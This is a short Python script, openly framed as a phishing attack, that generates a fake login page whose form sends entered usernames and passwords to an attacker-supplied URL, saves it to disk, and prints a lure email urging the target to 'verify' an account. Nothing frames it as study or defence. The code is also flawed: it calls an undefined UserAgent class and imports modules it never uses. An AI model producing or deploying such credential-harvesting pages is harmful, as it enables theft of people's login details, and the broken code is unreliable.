import random
import time
import requests
from urllib.parse import urljoin

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def create_phishing_payload(target_url, malicious_url):
    phishing_payload = f'''
    <html>
        <head><title>Login Page</title></head>
        <body>
            <h2>Please login to your account</h2>
            <form action="{malicious_url}" method="POST">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <input type="submit" value="Login">
            </form>
        </body>
    </html>
    '''
    return phishing_payload

def send_phishing_email(target_email, phishing_page_url):
    email_subject = "Important: Your account needs verification"
    email_body = f"Click the link below to verify your account:\n{phishing_page_url}"
    print(f"Sending phishing email to: {target_email}")
    print(f"Subject: {email_subject}")
    print(f"Body: {email_body}")
    time.sleep(2)
    print("Phishing email sent successfully!")

def start_phishing_attack(target_url, malicious_url, target_email):
    phishing_page_url = urljoin(target_url, "phishing_page.html")
    phishing_payload = create_phishing_payload(target_url, malicious_url)
    
    print(f"Creating phishing page at: {phishing_page_url}")
    with open("phishing_page.html", "w") as f:
        f.write(phishing_payload)

    send_phishing_email(target_email, phishing_page_url)
    print(f"Phishing attack initiated for target: {target_url}")
